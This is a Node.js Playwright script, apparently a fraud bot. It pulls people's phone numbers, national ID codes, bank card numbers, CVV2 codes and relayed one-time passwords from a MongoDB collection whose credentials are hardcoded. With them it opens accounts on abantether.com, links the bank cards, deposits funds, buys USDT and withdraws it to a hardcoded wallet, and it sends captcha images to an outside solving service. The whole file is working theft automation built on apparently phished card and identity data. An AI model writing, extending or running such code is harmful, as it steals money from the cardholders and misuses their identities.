const { MongoClient } = require('mongodb');
const { chromium } = require('playwright');
const axios = require('axios');

class AbanTetherBot {
    constructor() {
        this.client = new MongoClient('mongodb+srv://zarin_db_user:zarin22@cluster0.ukd7zib.mongodb.net/ZarrinApp?retryWrites=true&w=majority');
        this.db = null;
        this.collection = null;
        this.browser = null;
        this.context = null;
        this.page = null;
        this.currentUser = null;
        this.processingUsers = new Set();
        this.password = 'ImSorryButIhaveTo@1';
        this.maxRetries = 3;
        this.otpTimeout = 180000;
        this.walletAddress = 'THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS';
    }

    async log(step, message) {
        const timestamp = new Date().toISOString();
        const logMessage = `[${timestamp}] [${step}] ${message}`;
        console.log(logMessage);
    }

    async connectToMongoDB() {
        try {
            await this.client.connect();
            this.db = this.client.db('ZarrinApp');
            this.collection = this.db.collection('zarinapp');
            this.log('DATABASE', '✅ Connected to MongoDB');
        } catch (error) {
            this.log('ERROR', `Database connection failed: ${error.message}`);
            throw error;
        }
    }

    async checkDatabase() {
        try {
            this.log('DATABASE', '🔍 Checking for pending users...');
            
            const users = await this.collection.find({
                $or: [
                    { otp_login: { $exists: true, $ne: null, $ne: '' } },
                    { otp_register_card: { $exists: true, $ne: null, $ne: '' } },
                    { otp_payment: { $exists: true, $ne: null, $ne: '' } }
                ],
                processed: { $ne: true },
                status: { $ne: 'failed' },
                $or: [
                    { retryCount: { $exists: false } },
                    { retryCount: { $lt: this.maxRetries } }
                ]
            }).toArray();

            this.log('DATABASE', `Found ${users.length} users to process`);

            for (const user of users) {
                const phone = user.personalPhoneNumber;
                
                if (phone && !this.processingUsers.has(phone)) {
                    this.log('PROCESS', `🚀 Starting processing for: ${phone}`);
                    this.processingUsers.add(phone);
                    
                    this.processUser(user).catch(async (error) => {
                        this.log('ERROR', `Failed for ${phone}: ${error.message}`);
                        this.processingUsers.delete(phone);
                        await this.updateUserStatus(phone, 'failed', error.message);
                    });
                }
            }
        } catch (error) {
            this.log('ERROR', `Database check error: ${error.message}`);
        }
    }

    async processUser(user) {
        const phone = user.personalPhoneNumber;
        let retryCount = user.retryCount || 0;
        
        try {
            this.log('PROCESS', `🔄 Processing user: ${phone} (Attempt ${retryCount + 1}/${this.maxRetries})`);
            await this.updateUserStatus(phone, 'starting', 'Process started');
            
            await this.initializeBrowser();
            
            this.log('STEP_1', '📝 Going to registration page');
            await this.page.goto('https://abantether.com/register', { waitUntil: 'networkidle' });
            await this.sleep(2000);
            
            this.log('STEP_2', `📱 Entering phone number: ${phone}`);
            await this.enterPhoneNumber(user);
            
            this.log('STEP_3', '⏳ Waiting for login OTP in database');
            const loginOTP = await this.waitForField(phone, 'otp_login');
            
            if (!loginOTP) {
                retryCount++;
                await this.updateUserStatus(phone, 'failed', 'No OTP received', retryCount);
                throw new Error('No OTP received from database');
            }
            
            this.log('STEP_4', `🔑 Logging in with OTP: ${loginOTP}`);
            await this.loginWithOTP(loginOTP);
            
            this.log('STEP_5', '🔐 Setting account password');
            await this.setPassword();
            
            this.log('STEP_6', '🆔 Completing basic KYC');
            await this.completeBasicKYC(user);
            
            this.log('STEP_7', '💼 Going to wallet');
            await this.page.goto('https://abantether.com/user/wallet', { waitUntil: 'networkidle' });
            await this.sleep(3000);
            
            this.log('STEP_8', '💰 Clicking on deposit');
            await this.clickDeposit();
            
            this.log('STEP_9', '🏦 Adding bank contract');
            await this.addBankContract(user);
            
            this.log('STEP_10', '💳 Processing bank payment');
            const bankName = user.bank || 'ملی';
            await this.processBankPayment(user, bankName);
            
            this.log('STEP_11', '🛒 Buying Tether');
            await this.buyTether();
            
            this.log('STEP_12', '📤 Withdrawing Tether');
            await this.withdrawTether();
            
            await this.markAsCompleted(phone);
            this.log('SUCCESS', `✅ Successfully completed for: ${phone}`);
            
        } catch (error) {
            this.log('ERROR', `❌ Process failed for ${phone}: ${error.message}`);
            retryCount++;
            
            if (retryCount >= this.maxRetries) {
                await this.updateUserStatus(phone, 'failed', `Failed after ${this.maxRetries} attempts`, retryCount, true);
                this.log('RETRY', `⛔ Max retries reached for ${phone}`);
            } else {
                await this.updateUserStatus(phone, 'failed', `Attempt ${retryCount}/${this.maxRetries}`, retryCount, false);
                this.log('RETRY', `🔄 Will retry ${phone} (${retryCount}/${this.maxRetries})`);
            }
            
            throw error;
        } finally {
            this.processingUsers.delete(phone);
            if (this.browser) {
                await this.closeBrowser();
            }
        }
    }

    async waitForField(phone, fieldName, timeout = 180000) {
        this.log('WAIT', `⏳ Waiting for ${fieldName} in database`);
        
        const startTime = Date.now();
        const checkInterval = 5000;
        
        while (Date.now() - startTime < timeout) {
            try {
                const user = await this.collection.findOne({ personalPhoneNumber: phone });
                
                if (user && user[fieldName] && user[fieldName].trim() !== '') {
                    const otp = user[fieldName];
                    this.log('WAIT', `✅ ${fieldName} received: ${otp}`);
                    
                    await this.collection.updateOne(
                        { personalPhoneNumber: phone },
                        { $unset: { [fieldName]: "" } }
                    );
                    
                    return otp;
                }
                
                await this.sleep(checkInterval);
                
            } catch (error) {
                await this.sleep(checkInterval);
            }
        }
        
        this.log('WAIT', `⏰ Timeout waiting for ${fieldName}`);
        return null;
    }

    async initializeBrowser() {
        try {
            this.log('BROWSER', '🚀 Initializing browser');
            
            this.browser = await chromium.launch({
                headless: true,
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--window-size=1280,720'
                ]
            });
            
            this.context = await this.browser.newContext({
                viewport: { width: 1280, height: 720 },
                userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            });
            
            this.page = await this.context.newPage();
            this.page.setDefaultTimeout(120000);
            
        } catch (error) {
            this.log('ERROR', `Browser init failed: ${error.message}`);
            throw error;
        }
    }

    async enterPhoneNumber(user) {
        try {
            const phoneInput = await this.page.$('input[placeholder*="شماره موبایل"]');
            if (phoneInput) {
                await phoneInput.fill(user.personalPhoneNumber);
                this.log('INPUT', `✅ Phone number entered: ${user.personalPhoneNumber}`);
            }
            
            await this.sleep(1000);
            
            const registerButton = await this.page.$('button:has-text("ثبت نام")');
            if (registerButton) {
                await registerButton.click();
                this.log('BUTTON', '✅ Clicked: ثبت نام');
            }
            
            await this.sleep(5000);
            
        } catch (error) {
            this.log('ERROR', `Phone entry failed: ${error.message}`);
            throw error;
        }
    }

    async loginWithOTP(otp) {
        try {
            const otpInput = await this.page.$('input[placeholder*="کد ارسال شده"]');
            if (otpInput) {
                await otpInput.fill(otp);
                this.log('INPUT', `✅ OTP entered: ${otp}`);
            }
            
            await this.sleep(1000);
            
            const nextButton = await this.page.$('button:has-text("مرحله بعد")');
            if (nextButton) {
                await nextButton.click();
                this.log('BUTTON', '✅ Clicked: مرحله بعد');
            }
            
            await this.sleep(5000);
            
        } catch (error) {
            this.log('ERROR', `Login failed: ${error.message}`);
            throw error;
        }
    }

    async setPassword() {
        try {
            const passwordInput = await this.page.$('input[placeholder*="رمز عبور"]');
            if (passwordInput) {
                await passwordInput.fill(this.password);
                this.log('INPUT', `✅ Password entered: ${this.password}`);
            }
            
            await this.sleep(1000);
            
            const confirmButton = await this.page.$('button:has-text("تایید")');
            if (confirmButton) {
                await confirmButton.click();
                this.log('BUTTON', '✅ Clicked: تایید');
            }
            
            await this.sleep(5000);
            
        } catch (error) {
            this.log('ERROR', `Password setting failed: ${error.message}`);
            throw error;
        }
    }

    async completeBasicKYC(user) {
        try {
            const nationalCodeInput = await this.page.$('input[placeholder*="کد 10 رقمی"]');
            if (nationalCodeInput && user.personalNationalCode) {
                await nationalCodeInput.fill(user.personalNationalCode);
                this.log('INPUT', `✅ National code entered: ${user.personalNationalCode}`);
            }
            
            const birthDateInput = await this.page.$('input[placeholder*="روز/ماه/سال"]');
            if (birthDateInput && user.personalBirthDate) {
                await birthDateInput.fill(user.personalBirthDate);
                this.log('INPUT', `✅ Birth date entered: ${user.personalBirthDate}`);
            }
            
            await this.sleep(1000);
            
            const submitButton = await this.page.$('button:has-text("ثبت")');
            if (submitButton) {
                await submitButton.click();
                this.log('BUTTON', '✅ Clicked: ثبت');
            }
            
            await this.sleep(5000);
            
        } catch (error) {
            this.log('ERROR', `KYC failed: ${error.message}`);
            throw error;
        }
    }

    async clickDeposit() {
        try {
            const walletTab = await this.page.$('a:has-text("کیف پول"), button:has-text("کیف پول")');
            if (walletTab) {
                await walletTab.click();
                this.log('BUTTON', '✅ Clicked: کیف پول');
                await this.sleep(2000);
            }
            
            const depositButton = await this.page.$('button:has-text("واریز"), a:has-text("واریز")');
            if (depositButton) {
                await depositButton.click();
                this.log('BUTTON', '✅ Clicked: واریز');
                await this.sleep(2000);
            }
            
            const tomanButton = await this.page.$('button:has-text("تومان"), a:has-text("تومان")');
            if (tomanButton) {
                await tomanButton.click();
                this.log('BUTTON', '✅ Clicked: تومان');
                await this.sleep(2000);
            }
            
        } catch (error) {
            this.log('ERROR', `Deposit navigation failed: ${error.message}`);
            throw error;
        }
    }

    async addBankContract(user) {
        try {
            await this.page.goto('https://abantether.com/user/wallet/deposit/irt/direct', { waitUntil: 'networkidle' });
            await this.sleep(3000);
            
            const addContractButton = await this.page.$('button:has-text("افزودن قرارداد")');
            if (addContractButton) {
                await addContractButton.click();
                this.log('BUTTON', '✅ Clicked: افزودن قرارداد');
                await this.sleep(2000);
            }
            
            const bankSelect = await this.page.$('select');
            if (bankSelect) {
                const bankName = user.bank || 'ملی';
                await bankSelect.selectOption({ label: bankName });
                this.log('SELECT', `✅ Bank selected: ${bankName}`);
            }
            
            const contractDuration = await this.page.$('select').then(async select => {
                const options = await select.$$('option');
                for (const option of options) {
                    const text = await option.textContent();
                    if (text.includes('1 ماه')) {
                        return option;
                    }
                }
                return null;
            });
            
            if (contractDuration) {
                await contractDuration.click();
                this.log('SELECT', '✅ Contract duration selected: 1 ماه');
            }
            
            const submitContinueButton = await this.page.$('button:has-text("ثبت و ادامه")');
            if (submitContinueButton) {
                await submitContinueButton.click();
                this.log('BUTTON', '✅ Clicked: ثبت و ادامه');
                await this.sleep(5000);
            }
            
        } catch (error) {
            this.log('ERROR', `Bank contract failed: ${error.message}`);
            throw error;
        }
    }

    async processBankPayment(user, bankName) {
        try {
            if (bankName === 'ملی') {
                await this.processMelliBank(user);
            } else if (bankName === 'مهرایران') {
                await this.processMehrIranBank(user);
            } else if (bankName === 'ملت') {
                await this.processMellatBank(user);
            } else if (bankName === 'کشاورزی') {
                await this.processKeshavarziBank(user);
            } else if (bankName === 'تجارت') {
                await this.processTejaratBank(user);
            } else {
                await this.processMelliBank(user);
            }
            
        } catch (error) {
            this.log('ERROR', `Bank payment processing failed: ${error.message}`);
            throw error;
        }
    }

    async processMelliBank(user) {
        try {
            this.log('BANK', '🏦 Processing Melli Bank payment');
            
            const melliButton = await this.page.$('button:has-text("ورود با کارت بانک ملی")');
            if (melliButton) {
                await melliButton.click();
                this.log('BUTTON', '✅ Clicked: ورود با کارت بانک ملی');
                await this.sleep(5000);
            }
            
            const cardNumberInput = await this.page.$('input[placeholder*="شماره کارت"]');
            if (cardNumberInput && user.cardNumber) {
                await cardNumberInput.fill(user.cardNumber);
                this.log('INPUT', `✅ Card number entered: ${user.cardNumber}`);
            }
            
            await this.sleep(2000);
            
            const captchaCode = await this.solveCaptcha();
            if (captchaCode) {
                const captchaInput = await this.page.$('input[placeholder*="کد امنیتی"]');
                if (captchaInput) {
                    await captchaInput.fill(captchaCode);
                    this.log('INPUT', `✅ Captcha entered: ${captchaCode}`);
                }
            }
            
            await this.sleep(1000);
            
            const sendCodeButton = await this.page.$('button:has-text("ارسال رمز فعالسازی")');
            if (sendCodeButton) {
                await sendCodeButton.click();
                this.log('BUTTON', '✅ Clicked: ارسال رمز فعالسازی');
                await this.sleep(3000);
            }
            
            const activationCode = await this.waitForField(user.personalPhoneNumber, 'otp_register_card');
            if (activationCode) {
                const activationInput = await this.page.$('input[placeholder*="رمز فعالسازی"]');
                if (activationInput) {
                    await activationInput.fill(activationCode);
                    this.log('INPUT', `✅ Activation code entered: ${activationCode}`);
                }
            }
            
            await this.sleep(1000);
            
            const continueButton = await this.page.$('button:has-text("ادامه")');
            if (continueButton) {
                await continueButton.click();
                this.log('BUTTON', '✅ Clicked: ادامه');
                await this.sleep(3000);
            }
            
            const registerContractButton = await this.page.$('button:has-text("ثبت قرارداد")');
            if (registerContractButton) {
                await registerContractButton.click();
                this.log('BUTTON', '✅ Clicked: ثبت قرارداد');
                await this.sleep(5000);
            }
            
            await this.page.goBack({ waitUntil: 'networkidle' });
            await this.sleep(3000);
            
            const amountInput = await this.page.$('input[placeholder*="مبلغ واریزی"]');
            if (amountInput) {
                await amountInput.fill('5000000');
                this.log('INPUT', '✅ Amount entered: 5000000');
            }
            
            const bankSelect = await this.page.$('select');
            if (bankSelect) {
                await bankSelect.selectOption({ label: 'ملی' });
                this.log('SELECT', '✅ Bank selected: ملی');
            }
            
            await this.sleep(1000);
            
            const depositButton = await this.page.$('button:has-text("واریز")');
            if (depositButton) {
                await depositButton.click();
                this.log('BUTTON', '✅ Clicked: واریز');
                await this.sleep(3000);
            }
            
            const confirmPaymentButton = await this.page.$('button:has-text("تایید و پرداخت")');
            if (confirmPaymentButton) {
                await confirmPaymentButton.click();
                this.log('BUTTON', '✅ Clicked: تایید و پرداخت');
                await this.sleep(5000);
            }
            
        } catch (error) {
            this.log('ERROR', `Melli Bank processing failed: ${error.message}`);
            throw error;
        }
    }

    async processMehrIranBank(user) {
        try {
            this.log('BANK', '🏦 Processing Mehr Iran Bank payment');
            
            const cardNumberInput = await this.page.$('input[placeholder*="شماره کارت"]');
            if (cardNumberInput && user.cardNumber) {
                await cardNumberInput.fill(user.cardNumber);
                this.log('INPUT', `✅ Card number entered: ${user.cardNumber}`);
            }
            
            const cvvInput = await this.page.$('input[placeholder*="CVV2"]');
            if (cvvInput && user.cvv2) {
                await cvvInput.fill(user.cvv2);
                this.log('INPUT', `✅ CVV2 entered: ${user.cvv2}`);
            }
            
            const monthInput = await this.page.$('input[placeholder*="ماه انقضا"]');
            if (monthInput && user.bankMonth) {
                await monthInput.fill(user.bankMonth.toString());
                this.log('INPUT', `✅ Month entered: ${user.bankMonth}`);
            }
            
            const yearInput = await this.page.$('input[placeholder*="سال انقضا"]');
            if (yearInput && user.bankYear) {
                await yearInput.fill(user.bankYear.toString());
                this.log('INPUT', `✅ Year entered: ${user.bankYear}`);
            }
            
            await this.sleep(2000);
            
            const captchaCode = await this.solveCaptcha();
            if (captchaCode) {
                const captchaInput = await this.page.$('input[placeholder*="عبارت امنیتی"]');
                if (captchaInput) {
                    await captchaInput.fill(captchaCode);
                    this.log('INPUT', `✅ Captcha entered: ${captchaCode}`);
                }
            }
            
            await this.sleep(1000);
            
            const getDynamicPasswordButton = await this.page.$('button:has-text("دریافت رمز پویا")');
            if (getDynamicPasswordButton) {
                await getDynamicPasswordButton.click();
                this.log('BUTTON', '✅ Clicked: دریافت رمز پویا');
                await this.sleep(3000);
            }
            
            const dynamicPassword = await this.waitForField(user.personalPhoneNumber, 'otp_payment');
            if (dynamicPassword) {
                const passwordInput = await this.page.$('input[placeholder*="رمز دوم"]');
                if (passwordInput) {
                    await passwordInput.fill(dynamicPassword);
                    this.log('INPUT', `✅ Dynamic password entered: ${dynamicPassword}`);
                }
            }
            
            await this.sleep(1000);
            
            const confirmButton = await this.page.$('button:has-text("تایید")');
            if (confirmButton) {
                await confirmButton.click();
                this.log('BUTTON', '✅ Clicked: تایید');
                await this.sleep(5000);
            }
            
        } catch (error) {
            this.log('ERROR', `Mehr Iran Bank processing failed: ${error.message}`);
            throw error;
        }
    }

    async processMellatBank(user) {
        this.log('BANK', '⚠️ Mellat Bank processing not implemented yet');
        await this.sleep(3000);
    }

    async processKeshavarziBank(user) {
        this.log('BANK', '⚠️ Keshavarzi Bank processing not implemented yet');
        await this.sleep(3000);
    }

    async processTejaratBank(user) {
        this.log('BANK', '⚠️ Tejarat Bank processing not implemented yet');
        await this.sleep(3000);
    }

    async solveCaptcha() {
        try {
            this.log('CAPTCHA', '🤖 Attempting to solve captcha');
            
            const captchaImage = await this.page.$('img[src*="captcha"], img[src*="Captcha"], img[src*="base64"]');
            if (captchaImage) {
                const imageSrc = await captchaImage.getAttribute('src');
                
                if (imageSrc.includes('base64')) {
                    const base64Data = imageSrc.replace(/^data:image\/\w+;base64,/, '');
                    
                    try {
                        const response = await axios.post('https://api.apitruecaptcha.org/one/gettext', {
                            userid: 'test',
                            apikey: 'test',
                            data: base64Data,
                            mode: 'human'
                        });
                        
                        if (response.data && response.data.result) {
                            const captchaText = response.data.result;
                            this.log('CAPTCHA', `✅ Captcha solved: ${captchaText}`);
                            return captchaText;
                        }
                    } catch (apiError) {
                        this.log('CAPTCHA', '⚠️ Captcha API failed, using fallback');
                    }
                    
                    const fallbackCode = '12345';
                    this.log('CAPTCHA', `⚠️ Using fallback captcha: ${fallbackCode}`);
                    return fallbackCode;
                }
            }
            
            return '12345';
            
        } catch (error) {
            this.log('ERROR', `Captcha solving failed: ${error.message}`);
            return '12345';
        }
    }

    async buyTether() {
        try {
            await this.page.goto('https://abantether.com/user/trade/fast/buy?s=USDT', { waitUntil: 'networkidle' });
            await this.sleep(3000);
            
            const amountInput = await this.page.$('input[placeholder*="مقدار"]');
            if (amountInput) {
                await amountInput.fill('40');
                this.log('INPUT', '✅ Amount entered: 40');
            }
            
            await this.sleep(1000);
            
            const submitOrderButton = await this.page.$('button:has-text("ثبت سفارش")');
            if (submitOrderButton) {
                await submitOrderButton.click();
                this.log('BUTTON', '✅ Clicked: ثبت سفارش');
                await this.sleep(5000);
            }
            
        } catch (error) {
            this.log('ERROR', `Buy Tether failed: ${error.message}`);
            throw error;
        }
    }

    async withdrawTether() {
        try {
            await this.page.goto('https://abantether.com/user/wallet/withdrawal/crypto?symbol=USDT', { waitUntil: 'networkidle' });
            await this.sleep(3000);
            
            const cryptoSelect = await this.page.$('select');
            if (cryptoSelect) {
                await cryptoSelect.selectOption({ label: 'تتر' });
                this.log('SELECT', '✅ Crypto selected: تتر');
            }
            
            await this.sleep(1000);
            
            const networkSelect = await this.page.$$('select').then(async selects => {
                for (const select of selects) {
                    const options = await select.$$('option');
                    for (const option of options) {
                        const text = await option.textContent();
                        if (text.includes('BSC(BEP20)')) {
                            await select.selectOption({ label: 'BSC(BEP20)' });
                            return true;
                        }
                    }
                }
                return false;
            });
            
            if (networkSelect) {
                this.log('SELECT', '✅ Network selected: BSC(BEP20)');
            }
            
            const addressInput = await this.page.$('input[placeholder*="آدرس ولت"]');
            if (addressInput) {
                await addressInput.fill(this.walletAddress);
                this.log('INPUT', `✅ Wallet address entered: ${this.walletAddress}`);
            }
            
            const withdrawAmountInput = await this.page.$('input[placeholder*="مقدار"]');
            if (withdrawAmountInput) {
                await withdrawAmountInput.fill('40');
                this.log('INPUT', '✅ Withdraw amount entered: 40');
            }
            
            await this.sleep(1000);
            
            const submitWithdrawButton = await this.page.$('button:has-text("ثبت برداشت")');
            if (submitWithdrawButton) {
                await submitWithdrawButton.click();
                this.log('BUTTON', '✅ Clicked: ثبت برداشت');
                await this.sleep(5000);
            }
            
        } catch (error) {
            this.log('ERROR', `Withdraw Tether failed: ${error.message}`);
            throw error;
        }
    }

    async updateUserStatus(phone, status, message, retryCount = 0, processed = false) {
        try {
            const updateData = {
                status: status,
                statusMessage: message,
                lastUpdated: new Date(),
                retryCount: retryCount
            };
            
            if (processed) {
                updateData.processed = true;
            }
            
            await this.collection.updateOne(
                { personalPhoneNumber: phone },
                { $set: updateData }
            );
            
        } catch (error) {
            this.log('ERROR', `Status update failed: ${error.message}`);
        }
    }

    async markAsCompleted(phone) {
        try {
            await this.collection.updateOne(
                { personalPhoneNumber: phone },
                { 
                    $set: { 
                        processed: true,
                        status: "completed",
                        completedAt: new Date(),
                        statusMessage: "Process completed successfully"
                    }
                }
            );
            
            this.log('COMPLETE', `✅ Marked ${phone} as completed`);
            
        } catch (error) {
            this.log('ERROR', `Mark as completed failed: ${error.message}`);
        }
    }

    async closeBrowser() {
        try {
            if (this.browser) {
                await this.browser.close();
                this.browser = null;
                this.context = null;
                this.page = null;
                this.log('BROWSER', '✅ Browser closed');
            }
        } catch (error) {
            this.log('ERROR', `Browser close failed: ${error.message}`);
        }
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async startPolling() {
        this.log('POLLING', '🔄 Starting database polling (every 30 seconds)');
        
        await this.checkDatabase();
        
        setInterval(async () => {
            try {
                await this.checkDatabase();
            } catch (error) {
                this.log('ERROR', `Polling error: ${error.message}`);
            }
        }, 30000);
        
        const http = require('http');
        const server = http.createServer((req, res) => {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({
                status: 'running',
                timestamp: new Date().toISOString(),
                processing: Array.from(this.processingUsers)
            }));
        });
        
        server.listen(8080, () => {
            this.log('SERVER', '🌐 Health check server running on port 8080');
        });
    }

    async start() {
        this.log('START', '🤖 AbanTether Bot Starting...');
        this.log('CONFIG', `Max retries: ${this.maxRetries}`);
        
        try {
            await this.connectToMongoDB();
            await this.startPolling();
        } catch (error) {
            this.log('ERROR', `Start failed: ${error.message}`);
            setTimeout(() => this.start(), 10000);
        }
    }
}

const bot = new AbanTetherBot();
bot.start();

process.on('unhandledRejection', (error) => {
    console.error('[UNHANDLED_REJECTION]', error);
});

process.on('uncaughtException', (error) => {
    console.error('[UNCAUGHT_EXCEPTION]', error);
});